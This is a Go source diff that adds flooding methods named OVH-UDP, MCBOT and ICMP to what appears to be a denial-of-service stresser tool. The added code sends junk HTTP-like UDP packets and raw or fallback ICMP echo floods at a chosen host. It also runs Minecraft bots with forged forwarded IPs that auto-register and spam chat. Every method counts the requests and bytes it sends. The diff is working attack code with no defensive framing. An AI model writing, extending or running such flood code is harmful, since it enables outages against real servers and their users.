@@ -68,6 +68,12 @@ func executeLayer4Method(cfg *Layer4Config, requestsSent, bytesSent *utils.Count
 		executeCPS(cfg, requestsSent, bytesSent)
 	case "CONNECTION":
 		executeCONNECTION(cfg, requestsSent, bytesSent)
+	case "OVH-UDP":
+		executeOVHUDP(cfg, requestsSent, bytesSent)
+	case "MCBOT":
+		executeMCBOT(cfg, requestsSent, bytesSent)
+	case "ICMP":
+		executeICMP(cfg, requestsSent, bytesSent)
 	default:
 		executeTCP(cfg, requestsSent, bytesSent)
 	}
@@ -350,4 +356,179 @@ func tcpChecksum(data []byte) uint16 {
 	sum = (sum >> 16) + (sum & 0xffff)
 	sum = sum + (sum >> 16)
 	return uint16(^sum)
+}
+
+func executeOVHUDP(cfg *Layer4Config, requestsSent, bytesSent *utils.Counter) {
+	// OVH-UDP requires raw sockets for custom UDP packets with HTTP payloads
+	// This is a simplified implementation that sends UDP packets with HTTP-like payloads
+	target := fmt.Sprintf("%s:%d", cfg.Host, cfg.Port)
+	addr, err := net.ResolveUDPAddr("udp", target)
+	if err != nil {
+		return
+	}
+
+	conn, err := net.DialUDP("udp", nil, addr)
+	if err != nil {
+		return
+	}
+	defer conn.Close()
+
+	methods := []string{"PGET", "POST", "HEAD", "OPTIONS", "PURGE"}
+	paths := []string{"/0/0/0/0/0/0", "/0/0/0/0/0/0/", "\\0\\0\\0\\0\\0\\0", "\\0\\0\\0\\0\\0\\0\\", "/", "/null", "/%00%00%00%00"}
+
+	for i := 0; i < utils.RandInt(2, 4); i++ {
+		payloadSize := utils.RandInt(1024, 2048)
+		randomPart := string(utils.RandomBytes(payloadSize))
+
+		method := methods[rand.Intn(len(methods))]
+		path := paths[rand.Intn(len(paths))]
+
+		payload := fmt.Sprintf("%s %s%s HTTP/1.1\nHost: %s:%d\r\n\r\n",
+			method, path, randomPart, cfg.Host, cfg.Port)
+
+		n, err := conn.Write([]byte(payload))
+		if err != nil {
+			break
+		}
+		requestsSent.Add(1)
+		bytesSent.Add(int64(n))
+	}
+}
+
+func executeMCBOT(cfg *Layer4Config, requestsSent, bytesSent *utils.Counter) {
+	target := fmt.Sprintf("%s:%d", cfg.Host, cfg.Port)
+	conn, err := net.DialTimeout("tcp", target, 1*time.Second)
+	if err != nil {
+		return
+	}
+	defer conn.Close()
+
+	// Generate UUID (simplified version - just use a random string)
+	uuid := fmt.Sprintf("%s-%s-%s-%s-%s",
+		utils.RandString(8),
+		utils.RandString(4),
+		utils.RandString(4),
+		utils.RandString(4),
+		utils.RandString(12))
+
+	// Send handshake with forwarding
+	handshake := minecraft.HandshakeForwarded(cfg.Host, uint16(cfg.Port), cfg.ProtocolID, 2, utils.RandIPv4(), uuid)
+	n1, err := conn.Write(handshake)
+	if err != nil {
+		return
+	}
+	bytesSent.Add(int64(n1))
+
+	// Generate username and password
+	username := fmt.Sprintf("Bot_%s", utils.RandString(5))
+	password := utils.RandString(8)
+
+	// Send login packet
+	loginPacket := minecraft.Login(cfg.ProtocolID, username)
+	n2, err := conn.Write(loginPacket)
+	if err != nil {
+		return
+	}
+	bytesSent.Add(int64(n2))
+
+	// Wait a bit before registering
+	time.Sleep(1500 * time.Millisecond)
+
+	// Send register command
+	registerCmd := fmt.Sprintf("/register %s %s", password, password)
+	registerPacket := minecraft.Chat(cfg.ProtocolID, registerCmd)
+	n3, err := conn.Write(registerPacket)
+	if err != nil {
+		return
+	}
+	bytesSent.Add(int64(n3))
+
+	// Send login command
+	loginCmd := fmt.Sprintf("/login %s", password)
+	loginPacket2 := minecraft.Chat(cfg.ProtocolID, loginCmd)
+	n4, err := conn.Write(loginPacket2)
+	if err != nil {
+		return
+	}
+	bytesSent.Add(int64(n4))
+
+	// Send spam chat messages
+	for i := 0; i < 10; i++ {
+		chatMsg := utils.RandString(256)
+		chatPacket := minecraft.Chat(cfg.ProtocolID, chatMsg)
+		n, err := conn.Write(chatPacket)
+		if err != nil {
+			break
+		}
+		requestsSent.Add(1)
+		bytesSent.Add(int64(n))
+		time.Sleep(1100 * time.Millisecond)
+	}
+}
+
+func executeICMP(cfg *Layer4Config, requestsSent, bytesSent *utils.Counter) {
+	// ICMP flooding requires raw sockets which need elevated privileges
+	// This is a simplified implementation using UDP as a fallback
+	// For full ICMP support, the application needs to be run with root/admin privileges
+
+	// Try to create raw ICMP socket (may fail without privileges)
+	conn, err := net.DialTimeout("ip4:icmp", cfg.Host, 1*time.Second)
+	if err != nil {
+		// Fallback to UDP if raw socket creation fails
+		target := fmt.Sprintf("%s:%d", cfg.Host, cfg.Port)
+		udpAddr, err := net.ResolveUDPAddr("udp", target)
+		if err != nil {
+			return
+		}
+		udpConn, err := net.DialUDP("udp", nil, udpAddr)
+		if err != nil {
+			return
+		}
+		defer udpConn.Close()
+
+		// Send ICMP-like payload via UDP
+		for i := 0; i < 100; i++ {
+			payload := utils.RandomBytes(utils.RandInt(16, 1024))
+			n, err := udpConn.Write(payload)
+			if err != nil {
+				break
+			}
+			requestsSent.Add(1)
+			bytesSent.Add(int64(n))
+		}
+		return
+	}
+	defer conn.Close()
+
+	// Send ICMP echo requests
+	for i := 0; i < 100; i++ {
+		// ICMP Echo Request
+		// Type: 8 (Echo Request), Code: 0
+		icmpType := byte(8)
+		icmpCode := byte(0)
+		checksum := uint16(0)
+		identifier := uint16(rand.Intn(65535))
+		sequence := uint16(i)
+
+		// Construct ICMP packet
+		payload := utils.RandomBytes(utils.RandInt(16, 1024))
+		packet := make([]byte, 8+len(payload))
+		packet[0] = icmpType
+		packet[1] = icmpCode
+		binary.BigEndian.PutUint16(packet[2:4], checksum)
+		binary.BigEndian.PutUint16(packet[4:6], identifier)
+		binary.BigEndian.PutUint16(packet[6:8], sequence)
+		copy(packet[8:], payload)
+
+		// Calculate checksum
+		checksum = tcpChecksum(packet)
+		binary.BigEndian.PutUint16(packet[2:4], checksum)
+
+		n, err := conn.Write(packet)
+		if err != nil {
+			break
+		}
+		requestsSent.Add(1)
+		bytesSent.Add(int64(n))
+	}
 }
